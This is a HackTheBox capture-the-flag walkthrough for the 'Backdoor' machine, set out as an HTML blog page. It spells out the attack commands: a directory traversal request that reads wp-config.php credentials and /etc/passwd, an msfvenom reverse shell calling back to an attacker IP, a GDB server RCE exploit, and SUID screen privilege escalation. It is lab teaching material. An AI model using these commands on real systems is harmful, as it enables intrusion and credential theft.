@@ -1,0 +1,104 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Backdoor HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/backdoor-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-12-24T15:17:54+00:00">December 24, 2022</time><time class="updated" datetime="2025-06-10T20:17:45+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <h3><span style="color: #800000;">Summary</span></h3>
+<p><span style="color: #000000;">Backdoor is a Linux machine and is considered an easy box the hack the box. On this box we will begin with a basic port scan and move laterally. Then we will enumerate the WordPress webpage.  Then we will do a vulnerability assessment and exploit directory traversal vulnerability. From the running process, we will be exploiting the GDB server and gain an initial foothold in the target system. Then we will be tasked to gain root access where we will exploit SUID is set to screen.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Initial Access</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap TCP Port Scan</span></li>
+<li><span style="color: #000000;">Web Page Enumeration</span></li>
+<li><span style="color: #000000;">Searching For the WordPress eBook Exploit</span></li>
+<li><span style="color: #000000;">Directory Traversal Vulnerability Exploit</span></li>
+<li><span style="color: #000000;">Enumerate Running process in the target system</span></li>
+<li><span style="color: #000000;">Searching for the GDB Server Exploit</span></li>
+<li><span style="color: #000000;">GDB Server RCE Exploitation</span></li>
+<li><span style="color: #000000;">User Flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">SUID-Screen Exploitation</span></li>
+<li><span style="color: #000000;">Root Flag</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s exploit it step by step.</span></p>
+<h3><span style="color: #800000;">Initial Access</span></h3>
+<p><span style="color: #000000;">We are going to start the assessment with the normal TCP/IP port scanning.</span></p>
+<h4><span style="text-decoration: underline; color: #000000;"><strong>Nmap TCP Port Scan</strong></span></h4>
+<p><span style="color: #000000;">Let’s start with the port scan. We are using nmap to find out which ports are open and what services are running in the target host. Nmap is a popular port scanning tool comes with Kali Linux. To perform port scan, we have used –<strong>sV</strong> and <strong>-p-</strong> flag which performs a service version and full port scan against the target machine.</span></p>
+<p><span style="color: #000000;">Flags features:</span></p>
+<p><span style="color: #000000;"><strong>-sV</strong>:  Attempts to determine the service version</span></p>
+<p><span style="color: #000000;"><strong>-p-</strong>:  Attempts to full port scan</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -sV 10.129.96.68</pre>
+<p><span style="color: #000000;">From the nmap scan, we have found there were only three ports open, which is port <strong>22,80</strong> and port <strong>1337</strong>. As usual <strong>HTTP service</strong> is running on port 80, <strong>SSH service </strong>is running on port 22 and we do not know about 1337 now. HTTP service is used for webhosting and the SSH service is used for remote connection. SSH version is latest, and we did not find any vulnerabilities on SSH version 8.2p1 and the possible attack we can perform against the SSH service at this stage is bruteforce only which we might not need to do. Instead of thinking about the SSH bruteforce let’s start enumerating port 80.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXT8BKzvQenSDShrQsjmUbdom0gIf5Eb5kO36-qplnUXGw-3ESHIAAsaWMU2evNlNAiia_dTzGyftb6dNLu6Kc3-hLM6bNkKZWqyDeIgtoFeF1joqw_qsfZRr6kWHpcdceru3geYPHx4o8Sw9o48M50Coogayw7FfaCL0E8Zv6x2hKMbrJOcOWbFqrHQ/s16000/1.png"/></p>
+<h4><span style="color: #000000;"><strong><span style="text-decoration: underline;">Web Page Enumeration</span> </strong></span></h4>
+<p><span style="color: #000000;">We begin with enumerating port 80 and access it over the browser shown on a WordPress site. Nothing looks interesting here in the web page, we saw a backdoor title of the machine name backdoor. The backdoor could be the domain name here.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEit2s47GBiweoAvmqfql7A5vB554W3pWUCLnN7u-xGUre2UDC-tZmT8cWemdDiauaJBQa3jbGsI0f5iBqDxVmyr5VuGZ4deeVM4yPh6EoUt5B4l8yH3T5YoZ5zISzuhHnCyqEOtX0b_dWVryYDheY9KvNzdhsNGmURtpKEwZsxZY_9y5tI1SMuzTDKaCw/s16000/2.png"/></p>
+<p><span style="color: #000000;">Then we decided to check its plugin using default directories. A list of the default WordPress directories can be available here:</span></p>
+<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress</a></p>
+<p><span style="color: #000000;">The default plugin directory path is:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">/wp-content/plugins/</pre>
+<p><span style="color: #000000;">We saw an <strong>ebook-download</strong> directory is present there. We can check if there are any public exploits available for the eBook WordPress plugin.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYGqREUbvtsd43rmCmbZ61WdMGcNK3-zoYGH7xUwuNhWL70Pv0u-_0qZpnWniR5qtwGCFkX-jv75DBwsxF11geBPAZZ3h2THQnZ-OzrixL64axlEsOvNUvH0nQhi57WquwLxLUOrXgrnTpZpH3cD4d1eevGdG2RviuecS0ttYisDvd_qFA-ILtaPyzdw/s16000/3.png"/></p>
+<h4><span style="text-decoration: underline; color: #000000;"><strong>Searching For the WordPress eBook Exploit</strong></span></h4>
+<p><span style="color: #000000;">We are using a kali inbuilt tool searchsploit to find out if any exploits are available in the public exploit database. From the searchsploit result, we found that WordPress eBook download has a <strong>directory</strong> <strong>traversal</strong> vulnerability. Then we downloaded the exploit to analyse how it works. We can download it using <strong>-m</strong> flag on searchsploit.  After analysing the exploit code, we found a vulnerable path parameter which is vulnerable to File inclusion.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit ebook wordpress
+searchsploit -m 39575
+cat 39575.txt</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhX2V3EzxDOzvZL7K8qI2M2TPBTeMYJ42-YJBZfmMdKTbWhFA-XkpQSEM32_-28bp4L16BUwBxMyRPL6SDTvsUlcJI-5c_E_TKRZufcp4ZmMJ6fChCIbDvZIJASuk9o3YSX9qdDA2FYuYBlR-ifnoqhEPIWjkyVeNvHAaDivZErLdhlbpqzubR4x15Q4g/s16000/4.png"/></p>
+<h4><span style="text-decoration: underline; color: #000000;"><strong>Directory Traversal Vulnerability Exploit</strong></span></h4>
+<p><span style="color: #000000;">As we have the vulnerable parameter, now we are in a position to exploit it. We tried to exploit the WordPress configuration file (wp-config) which has sensitive information such as database credentials of the WordPress. As expected, we got the WordPress database username and password but it did not work with any available service.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Curl 10.129.96.68/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXhupVNfXqw9tdI5rpKxvoLRAar7Udtrpp1Auz3pepcA4ZhWGB4CgxJ5gjdDMO4rwMAArGExAtWpfAv7XhJ4vYgeTHhUFpIcEYShStiik_QX6bj8fdenIDj6STJ_hOSjuPyCXHj9saaOgElUR0piQP6ZYmqveqIygnPSbON0qrzmVOKdI6FgjPRghfKQ/s16000/5.png"/></p>
+<p><span style="color: #000000;">Then we decided to list the users in the target system. It is available in the <strong>/etc/passwd</strong> file in Linux systems. We saw a user named <strong>user</strong> is available in the target system and we tried log in via SSH with the obtained password and again failed to gain access.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5IbvrNbanscf3ParCvZVdfJjikvQ93GFB7rTJjvM70v71AGCkW4j0PdIVfZMUso1SIXHCm0xivB5Lc55WpRrTr_MEW34ftTd8pB0cLqDQmP9y8kI-PVZBMxHtTZzuKV8fEovwjfRvCYAbNy05fKhRB30QvNfF28k4cATAcuA7Wo670cC6tIxnMQ_gLw/s16000/8.png"/></p>
+<p><span style="color: #000000;">Many attempts of gaining a foothold in the target system failed. Then we decided to enumerate further. Then we created a bash script to find out what <strong>processes </strong>are running on the target system because sometimes third-party applications may have some vulnerabilities which could lead an attacker to gain access to the target system.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglDgpS0CQ8HtQm_oZ7xexji1cFQ09-mGdmHfesQ5k5rmEp0tVpcAunMUi6I_QKhPWciqCiAawcL2-PJdnKBDRY6OqpZFrEBGYeYE9jityIB_xP_Ns4ogspU8L5hGEfZrJZ0EseLefxVdM-vwSWdqt8td-NoOms3Nv0w5_PVohYi5jjD9ATxBgCQpyvHA/s16000/9.png"/></p>
+<p><span style="color: #000000;">As we can see a GDB server is running on the target system. We can check whether we can find any vulnerabilities available for the GDB server. There are possibilities to have some other application installed which is also vulnerable to remote code execution.</span></p>
+<p><span style="color: #000000;"><strong>Source</strong>: </span><span style="color: #0000ff;"><strong>https://0xdf.gitlab.io/</strong></span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsXv6JSvl1GP1_9kvAvLy2l3EHiNynXvX_FgNsrMz4KRu5SS5MjsGlDfxCP2nT_9IeC69WFnBOOgatlK-wgWtBDJ3EQnYy51prMsty6vcYehPS4R9WkrihIuE1XdVgj_lomT5XxNw5gu7TlMVGw-NO4pLLZEG2FZyEz0oSBa_xn_XejNjcVxgBlj2Csw/s16000/10.png"/></p>
+<p><span style="color: #000000;"><strong>Alternative:</strong></span></p>
+<p><span style="color: #000000;">We can also check the running process manually, below file can be used to check it. Just need to replace the file name with /proc/sched_debug on the vulnerable parameter.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">/proc/sched_debug</pre>
+<h4><span style="text-decoration: underline; color: #000000;"><strong>Searching For the GDB Server Exploit</strong></span></h4>
+<p><span style="color: #000000;">We are again using searchsploit to find out if there is any public exploit available for the GDB server which could help us to gain the initial foothold in the target system. From the searchsploit result, we found that <strong>gdbserver 9.2</strong> is vulnerable to remote code execution, but we do not know its version yet. Sometimes it is hard to find out the version of the installed application and we must test each exploit as there is only one so it’s worth checking it. We downloaded the exploit to check how it works.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit -m 50539</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiosHLE1n7tlvzgfo9O1BgpLzwFCXhmxTVdMly12hU5EWkUVoHwJh5P50UGUl-QTRQU1-2yXraBQSGjWiFRsdXFXCSV3EH3L-k4pHoQxdID4duLTxfQGcv30ESWU1mrbV1ENpZYulnjFrk-Wh42rYTWl4KNiMmP0fGzGyNOajnJ9ASMyHadJAhRZdUNPQ/s16000/15.png"/></p>
+<h4><span style="color: #000000;"><strong><span style="text-decoration: underline;">GDB server RCE Exploitation</span></strong></span></h4>
+<p><span style="color: #000000;">After downloading the exploit, we analysed the exploit code where we got its usage instructions. The exploit is indicating to create a msfvenom binary reverse shell and payload syntax is given in it. If we have a closer look, we can see that the exploit is indicating that the GDB port number to 1337 and we also found port <strong>1337</strong> is open in the target system.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjDoLBkGrakfHHpKpfRTFvVnH3LYrUj6DzJ6PPM9mqUClU6DYVFCjGpdTCbfpL43-jegC134eVB81TD3hUfduo3CcLkh-_CGsnc8BgdIA9y2LHBCoJduU13aXYy6NoCb8IEgq6SBYJlE4DpOiWNHnjDdS93BleJMPQcdKNgyNPwKsNVYoVmnfkWsDDkRw/s16000/16.png"/></p>
+<p><span style="color: #000000;">Let’s create a reverse shell binary using msfvenom. In the payload, we have given attacker’s the IP address (10.10.14.65) and listening port number (4444). Then we saved it as <strong>rev.bin.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.65 LPORT=4444 PrependFork=true -o rev.bin</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3F7aZO8TVr00wMv192k24LnrPhywwh8xQU36sGzWmjSbIO0uS3wBB2J3ZePFWH4GeNJZEove4ls_FA_HXpQT14RDqnMMeYrOWE2r1zAs1XPRfE50lfEeOJbS_VmabQfGQj2l9Ass9ASjxz_wh_8NU_5dT3m5hXOYK_E_H4sVdQWFKn6INdjNRsmw0Vw/s16000/17.png"/></p>
+<h4><span style="text-decoration: underline;"><strong>User flag</strong></span></h4>
+<p>After creating reverse shell binary, we followed the instructions from the exploit. Before firing the exploit, we turned on the netcat listener on our kali system on port 4444. Then we provided the target Ip address and target port where GDB server is running on the target system and our reverse shell. To reproduce the POC then follow the commands given below:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 50539.py 10.129.96.68:1337 rev.bin</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgp-vrl1ubZuUy79NByZB5KebdO9VTJBYEq3TqxNBKnhsdRfL3T-8jtQkBzu8zrpj4FET_fpzMdVmfZ7KM1AiDUt4depmj6fum6SCyyyeM1z730LIcGafm5hEk3P6x5FZVPbCDZ_8zWnwfNNGI8MfoxDpyy9q6nW6D1ysXOn6j5mEV3yGH9DDEntf5ahw/s16000/18.png"/></p>
+<p>After firing the exploit against the target system, we successfully receive a reverse shell as <strong>user </strong>on port 4444. We can grab our user flag from the user home directory.</p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_laR67Sh8qDJzk_fFj8hSXcpTxyAoEUz5e_cpKC_Ne-6lLBGNBLE9YFYYBxD1G20X6zcJzXTKqq8PAqlyvGOFiSX82LPGdJTty1-HqwQShgj-84xxIMnKBhBW45u1pnbdAz4gJ8lvKCcn72BvvIMIKbpx6lChT1qyEtM3gG_kI_zMDtiGOeVPmzqxhA/s16000/24.png"/></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Next, we need to escalate to root account from the low-privileged user account. We enumerated the target system and then decided to check SUID.</span></p>
+<h4><span style="text-decoration: underline; color: #000000;"><strong>SUID-Screen Exploitation</strong></span></h4>
+<p><span style="color: #000000;">Let’s list all the SUID binaries available in the target system. We saw a SUID screen appear in the results. It is like Tmux and if there is any screen session is running by the root then we can attach that session with a current user which will give us a root shell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -u=s -type f  2&gt;/dev/null</pre>
+<p><span style="color: #000000;"><strong>What is screen in Linux?</strong></span></p>
+<p><span style="color: #000000;">screen command in Linux <strong>provides the ability to launch and use multiple shell sessions from a single ssh session</strong>. When a process is started with ‘screen’, the process can be detached from the session &amp; then can reattach the session later.</span></p>
+<p><span style="color: #000000;">To make our exploit work, we need to upgrade our current shell and attach the root screen session with our current user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">export TERM=xterm
+screen -r root/root</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixlJe038AVEcaeBQseCugukyKEQv9Igw461cQBt1G5WF0CtgCGiYEvdUNHKNrs1iG5ryFikhkYSpnwHgzfWNSbO7SMDaPgYOGYebNenYcxTzZVMEz2E4mNRckRyx_IkFS5wYX-K7GGAdnhhpr8_euHf5_IDMA88kIq7clwdSaINA7SQaImp0rW4e-b3Q/s16000/25.png"/></p>
+<h4><span style="text-decoration: underline; color: #000000;"><strong>Root Flag</strong></span></h4>
+<p><span style="color: #000000;">After attaching a root screen session with the current user, we received a root shell spawned. Now we can grab our root flag from the root directory.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguhSW3epTO5TuKlctLaMo1FMAIwtQnTL39KoEE6hWVZkBT_KwJRu2TzbEkK7ZG3IBUhquk4afoyXB4wJ7SDJM61dCjqnRuBL2fYLTWzWRC2aD_2afQF4U_HSuhf3WGlAoIQzOtJNygKZhH_rC51TMVTw5oafjJWrQRUp81RfP7P5aMI4TKOaIWwM8bnQ/s16000/26.png"/></p>
+<h3><span style="color: #800000;"><strong>Conclusion</strong></span></h3>
+<p><span style="color: #000000;">This machine was fun and was a great source of learning, where we learned and explored so many things such as TCP port scan, service enumeration, Directory Traversal vulnerability, process enumeration on the target system, Special permissions (SUID), SUID exploit to perform local privilege escalation.</span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Subhash Paudel is a Penetration Tester and a CTF player who has a keen interest in various technologies and loves to explore more and more. Additionally, he is a technical writer at Hacking articles. Contact here</span><strong><span style="color: #000000;">:</span> <a href="https://au.linkedin.com/in/subhash-paudel-a021ab207">Linkedin</a> </strong>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/subhashpaudel94">Twitter</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
